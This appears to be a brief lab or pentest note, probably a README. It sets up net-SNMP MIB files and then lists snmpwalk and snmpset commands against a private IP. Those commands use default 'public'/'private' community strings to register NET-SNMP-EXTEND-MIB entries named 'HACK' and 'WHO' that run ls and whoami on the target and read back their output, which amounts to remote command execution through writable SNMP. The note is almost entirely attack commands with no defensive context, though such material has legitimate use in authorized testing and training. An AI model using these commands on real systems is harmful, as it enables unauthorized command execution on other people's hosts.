
## snmp-mibs download link

sudo git clone https://github.com/net-snmp/net-snmp.git

<img width="1270" height="841" alt="image" src="https://github.com/user-attachments/assets/bc6b36c4-6e2e-4d80-8a68-927290b17ad0" />

***Configuration process***




     sudo mkdir -p /usr/share/snmp/mibs

     sudo cp -r /usr/share/snmp/net-snmp/mibs/* /usr/share/snmp/mibs/


     mkdir -p ~/.snmp/mibs

     cp -r /usr/share/snmp/net-snmp/mibs/* ~/.snmp/mibs/


     export MIBDIRS="/usr/share/snmp/mibs:~/.snmp/mibs"

     export MIBS=+ALL




<img width="1318" height="716" alt="image" src="https://github.com/user-attachments/assets/5e2abfac-f744-46b2-ac5c-c1233226e8a1" />

***Commands***
     
      snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendObjects

      
      snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\"HACK\"

      or 

      snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\"HACK\"

  
      snmpset -v2c -c private 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendCommand.\"HACK\" s /bin/ls

      or
      
      snmpset -v2c -c private 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendArgs.\"HACK\" s "-la"

      snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\"HACK\"

      snmpset -v2c -c private 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendStatus.\"HACK\" i 6

      snmpset -v2c -c private 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendCommand.\"WHO\" s /usr/bin/whoami
      
      snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\"WHO\"

      snmpwalk -v2c -c public 192.168.202.149 1.3.6.1.4.1.8072.1.3



